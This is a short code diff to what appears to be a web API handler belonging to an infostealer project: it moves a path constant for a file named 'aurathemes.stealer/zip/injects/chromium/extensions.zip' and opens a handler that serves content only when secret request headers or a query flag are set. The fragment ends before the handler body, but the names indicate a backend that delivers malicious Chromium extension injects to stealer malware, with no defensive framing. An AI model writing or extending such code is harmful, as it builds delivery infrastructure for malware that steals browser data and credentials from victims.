@@ -1,7 +1,7 @@
 import path from 'path';
 import fs from 'fs';
 
-const injectPath = 'src/assets/scripts/aurathemes.stealer/zip/injects/chromium/extensions.zip';
+const injectPath = 'src/files/scripts/aurathemes.stealer/zip/injects/chromium/extensions.zip';
 
 export default async function handler(req, res) {
   if (req.headers['aurathemes'] === 'true' || req.headers['k4itrun'] === 'true' || req.query.aurathemes === 'true') {
